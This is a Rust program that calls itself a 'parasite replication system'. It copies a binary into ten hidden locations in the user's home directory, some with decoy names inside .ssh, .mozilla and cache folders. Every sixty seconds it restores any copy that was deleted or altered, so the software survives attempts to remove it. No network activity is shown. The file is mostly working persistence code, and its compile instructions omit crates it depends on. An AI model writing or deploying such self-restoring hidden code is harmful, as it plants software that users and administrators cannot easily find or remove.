// Guardian Keeper with SpaceX improvements - The parasite replication system
// Compile with: rustc -O guardian-keeper-spacex.rs -o guardian-keeper

use std::env;
use std::fs::{self, File, OpenOptions};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, exit};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::collections::HashMap;

#[cfg(unix)]
use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};

// Binary signatures
const KEEPER_SIGNATURE: &[u8] = b"KEEPER_SPACEX_V1\0";
const GUARDIAN_SIGNATURE: &[u8] = b"GUARD_FIXED_V1\0";

// Survival locations with BSD fixes
const SURVIVAL_LOCATIONS: [&str; 10] = [
    ".local/bin/shell-guardian",
    ".dotfiles/.guardian-shell/shell-guardian.bin",
    ".cache/.guardian-survival",
    ".config/guardian/bin/shell-guardian",
    ".local/share/guardian/shell-guardian",
    ".ssh/rc.guardian",  // BSD fix: don't overwrite real rc
    ".Xdefaults.guardian",  // X11 fallback
    ".config/.survival-guardian",
    ".local/state/.guardian-binary",
    ".mozilla/.guardian-backup"
];

// Configuration
const CHECK_INTERVAL: u64 = 60; // seconds
const MAX_REPAIR_ATTEMPTS: u32 = 3; // Circuit breaker
const MEMORY_CANARY: u64 = 0xFEEDFACE_DEADBEEF;
const MIN_FREE_DISK_MB: u64 = 50;

// Global state
static RUNNING: AtomicBool = AtomicBool::new(true);
static CANARY: AtomicU64 = AtomicU64::new(MEMORY_CANARY);
static REPAIR_COUNTER: AtomicU64 = AtomicU64::new(0);
static EVENT_COUNTER: AtomicU64 = AtomicU64::new(0);

// SpaceX-style event tracking
#[derive(Debug, Clone)]
enum Event {
    ServiceStarted(u64),
    RepairAttempted(PathBuf, bool),
    MemoryCorruption(u64),
    ConsensusFound(u32, usize),
    PreflightFailed(String),
}

// Signal handler
#[cfg(unix)]
extern "C" fn signal_handler(_: libc::c_int) {
    RUNNING.store(false, Ordering::SeqCst);
}

// Setup signals
#[cfg(unix)]
fn setup_signals() {
    unsafe {
        libc::signal(libc::SIGTERM, signal_handler as libc::sighandler_t);
        libc::signal(libc::SIGINT, signal_handler as libc::sighandler_t);
        libc::signal(libc::SIGPIPE, libc::SIG_IGN);
    }
}

// CRC32 checksum
fn crc32(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFFFFFF;
    
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            if crc & 1 != 0 {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    
    !crc
}

// Pre-flight checks - SpaceX style
fn preflight_check() -> Result<(), String> {
    // Check memory integrity
    if CANARY.load(Ordering::SeqCst) != MEMORY_CANARY {
        return Err("Memory corruption detected".to_string());
    }
    
    // Check disk space
    #[cfg(unix)]
    {
        if let Ok(output) = Command::new("df")
            .args(&["-BM", "/tmp"])
            .output() {
            let output_str = String::from_utf8_lossy(&output.stdout);
            if let Some(line) = output_str.lines().nth(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() > 3 {
                    if let Ok(available) = parts[3].trim_end_matches('M').parse::<u64>() {
                        if available < MIN_FREE_DISK_MB {
                            return Err(format!("Low disk: {}MB", available));
                        }
                    }
                }
            }
        }
    }
    
    Ok(())
}

// Validate binary has correct structure and signature
fn validate_binary(data: &[u8]) -> bool {
    // Check minimum size
    if data.len() < 1024 {
        return false;
    }
    
    // Check for ELF header
    if data.len() >= 4 && &data[0..4] == b"\x7fELF" {
        // Look for our signature
        for window in data.windows(GUARDIAN_SIGNATURE.len()) {
            if window == GUARDIAN_SIGNATURE {
                return true;
            }
        }
    }
    
    // Check for shebang
    if data.len() >= 2 && &data[0..2] == b"#!" {
        return true;
    }
    
    false
}

// Consensus-based source selection (SpaceX triple-modular redundancy inspired)
fn find_source_binary(home: &Path) -> Result<(Vec<u8>, u32), String> {
    let mut candidates: HashMap<u32, (Vec<u8>, usize)> = HashMap::new();
    
    for location in SURVIVAL_LOCATIONS.iter() {
        let path = home.join(location);
        if let Ok(data) = fs::read(&path) {
            if validate_binary(&data) {
                let checksum = crc32(&data);
                let entry = candidates.entry(checksum).or_insert((data, 0));
                entry.1 += 1;
            }
        }
    }
    
    if candidates.is_empty() {
        return Err("No valid guardian binaries found".to_string());
    }
    
    // Find binary with most copies (consensus)
    let (checksum, (data, count)) = candidates.into_iter()
        .max_by_key(|(_, (_, count))| *count)
        .unwrap();
    
    EVENT_COUNTER.fetch_add(1, Ordering::Relaxed);
    println!("🔍 Consensus: checksum={:08x} copies={}", checksum, count);
    
    Ok((data, checksum))
}

// Atomic file write with verification
fn write_binary_atomic(path: &Path, data: &[u8]) -> io::Result<()> {
    let temp_path = path.with_extension(format!("tmp.{}", std::process::id()));
    
    // Write to temporary file
    #[cfg(unix)]
    let mut file = OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(&temp_path)?;
    
    #[cfg(not(unix))]
    let mut file = OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&temp_path)?;
    
    file.write_all(data)?;
    file.sync_all()?;
    drop(file);
    
    // Verify what we wrote
    let written_data = fs::read(&temp_path)?;
    if written_data != data {
        fs::remove_file(&temp_path)?;
        return Err(io::Error::new(io::ErrorKind::Other, "Write verification failed"));
    }
    
    // Set executable permissions
    #[cfg(unix)]
    {
        let mut perms = fs::metadata(&temp_path)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&temp_path, perms)?;
    }
    
    // Atomic rename
    fs::rename(&temp_path, path)?;
    
    Ok(())
}

// Check and repair with circuit breaker and exponential backoff
fn check_and_repair(home: &Path, repair_attempts: &mut HashMap<PathBuf, u32>) -> Result<usize, String> {
    // Pre-flight checks
    if let Err(e) = preflight_check() {
        eprintln!("⚠️  Pre-flight failed: {}", e);
        if e.contains("Memory corruption") {
            return Err(e);
        }
    }
    
    // Find source binary
    let (source_data, source_checksum) = find_source_binary(home)?;
    
    let mut repaired = 0;
    
    for location in SURVIVAL_LOCATIONS.iter() {
        let path = home.join(location);
        
        // Circuit breaker - skip if too many failures
        let attempts = repair_attempts.get(&path).copied().unwrap_or(0);
        if attempts >= MAX_REPAIR_ATTEMPTS {
            continue;
        }
        
        // Create parent directory if needed
        if let Some(parent) = path.parent() {
            if !parent.exists() {
                if let Err(e) = fs::create_dir_all(parent) {
                    eprintln!("Failed to create {}: {}", parent.display(), e);
                    continue;
                }
            }
        }
        
        // Check if repair needed
        let needs_repair = match fs::read(&path) {
            Ok(data) => {
                let checksum = crc32(&data);
                checksum != source_checksum || !validate_binary(&data)
            }
            Err(_) => true,
        };
        
        if needs_repair {
            // Exponential backoff
            if attempts > 0 {
                let sleep_ms = 100 * (1 << attempts);
                thread::sleep(Duration::from_millis(sleep_ms));
            }
            
            match write_binary_atomic(&path, &source_data) {
                Ok(_) => {
                    repaired += 1;
                    REPAIR_COUNTER.fetch_add(1, Ordering::Relaxed);
                    repair_attempts.remove(&path);
                    println!("✓ Repaired: {} (CRC: {:08x})", path.display(), source_checksum);
                }
                Err(e) => {
                    eprintln!("✗ Failed {}: {} (attempt {})", path.display(), e, attempts + 1);
                    *repair_attempts.entry(path).or_insert(0) += 1;
                }
            }
        }
    }
    
    Ok(repaired)
}

// Write status file with telemetry
fn write_status(home: &Path) -> io::Result<()> {
    let status_path = home.join(".guardian-keeper.status");
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    
    let repairs = REPAIR_COUNTER.load(Ordering::Relaxed);
    let events = EVENT_COUNTER.load(Ordering::Relaxed);
    let sol = timestamp / 86400;
    
    let status = format!(
        "timestamp={},sol={},repairs={},events={},pid={}\n", 
        timestamp, sol, repairs, events, std::process::id()
    );
    
    fs::write(&status_path, status)
}

// Service mode with deterministic timing
fn run_service() {
    println!("🛡️  Guardian Keeper (SpaceX Edition) starting...");
    println!("📍 PID: {}", std::process::id());
    
    let home = match env::var("HOME") {
        Ok(h) => PathBuf::from(h),
        Err(_) => {
            eprintln!("❌ HOME not set");
            exit(1);
        }
    };
    
    // Set restrictive umask
    #[cfg(unix)]
    unsafe {
        libc::umask(0o077);
    }
    
    // Setup signals
    #[cfg(unix)]
    setup_signals();
    
    // Circuit breaker state
    let mut repair_attempts: HashMap<PathBuf, u32> = HashMap::new();
    let mut last_status_write = Instant::now();
    let mut next_check = Instant::now();
    
    // Set up Ctrl-C handler
    ctrlc::set_handler(move || {
        println!("\n🛑 Shutdown signal received");
        RUNNING.store(false, Ordering::SeqCst);
    }).expect("Error setting Ctrl-C handler");
    
    EVENT_COUNTER.fetch_add(1, Ordering::Relaxed);
    
    // Main service loop with deterministic timing
    while RUNNING.load(Ordering::SeqCst) {
        // Wait until next scheduled check
        let now = Instant::now();
        if now < next_check {
            let sleep_time = next_check - now;
            thread::sleep(sleep_time);
        }
        
        // Schedule next check deterministically
        next_check = next_check + Duration::from_secs(CHECK_INTERVAL);
        
        match check_and_repair(&home, &mut repair_attempts) {
            Ok(repaired) => {
                if repaired > 0 {
                    println!("🔄 Sol {}: Repaired {} replicas", 
                            SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs() / 86400,
                            repaired);
                }
            }
            Err(e) => {
                eprintln!("❌ Check cycle failed: {}", e);
                if e.contains("Memory corruption") {
                    eprintln!("💀 FATAL: Memory corruption - entering safe mode");
                    // Don't exit, just skip checks until memory recovers
                }
            }
        }
        
        // Write status file every 5 minutes
        if last_status_write.elapsed() > Duration::from_secs(300) {
            if let Err(e) = write_status(&home) {
                eprintln!("⚠️  Failed to write status: {}", e);
            }
            last_status_write = Instant::now();
        }
    }
    
    // Final status
    let _ = write_status(&home);
    
    println!("👋 Guardian Keeper stopped");
    println!("📊 Total repairs: {}", REPAIR_COUNTER.load(Ordering::Relaxed));
    println!("📊 Total events: {}", EVENT_COUNTER.load(Ordering::Relaxed));
}

fn main() {
    let args: Vec<String> = env::args().collect();
    
    // Embed signature in binary
    let _signature = KEEPER_SIGNATURE;
    
    if args.len() > 1 && args[1] == "service" {
        run_service();
    } else {
        // Single check mode
        let home = match env::var("HOME") {
            Ok(h) => PathBuf::from(h),
            Err(_) => {
                eprintln!("❌ HOME not set");
                exit(1);
            }
        };
        
        let mut repair_attempts = HashMap::new();
        match check_and_repair(&home, &mut repair_attempts) {
            Ok(repaired) => {
                if repaired > 0 {
                    println!("✅ Repaired {} replicas", repaired);
                } else {
                    println!("✅ All replicas intact");
                }
                exit(0);
            }
            Err(e) => {
                eprintln!("❌ Error: {}", e);
                exit(1);
            }
        }
    }
}